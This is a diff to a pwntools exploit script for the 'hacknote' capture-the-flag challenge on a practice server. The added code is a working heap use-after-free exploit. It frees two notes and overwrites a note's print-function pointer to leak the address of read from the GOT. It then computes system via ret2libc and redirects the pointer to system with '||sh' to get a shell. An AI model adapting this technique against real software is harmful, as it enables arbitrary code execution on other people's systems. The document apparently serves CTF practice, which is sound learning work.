@@ -28,14 +28,40 @@ uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
 context.log_level = 'DEBUG'
-binary = './pwn'
+binary = './hacknote'
 context.binary = binary
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',29776) if argv[1]=='r' else process(binary)
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = remote('node3.buuoj.cn',28542) if argv[1]=='r' else process(binary)
 
 # start
+def add(size,name='a'):
+	sla('choice :','1')
+	sla('size :',str(size))
+	sa('Content :',name)
 
+def delete(index):
+	sla('choice :','2')
+	sla('Index :',str(index))
+
+def show(index):
+	sla('choice :','3')
+	sla('Index :',str(index))
+
+add(0x10) # 0
+add(0x10) # 1
+delete(0)
+delete(1)
+print_content = 0x804862b
+add(0x8,flat(print_content,elf.got['read']))
+# step1: malloc(0x10) from 1's print func
+# step2: malloc(0x10) from 0's print func
+show(0)
+read = uu32(r(4))
+leak('read',read)
+system,binsh = ret2libc(read,'read')
+delete(2)
+add(0x8,flat(system,'||sh'))
+show(0)
 # end
 
 itr()
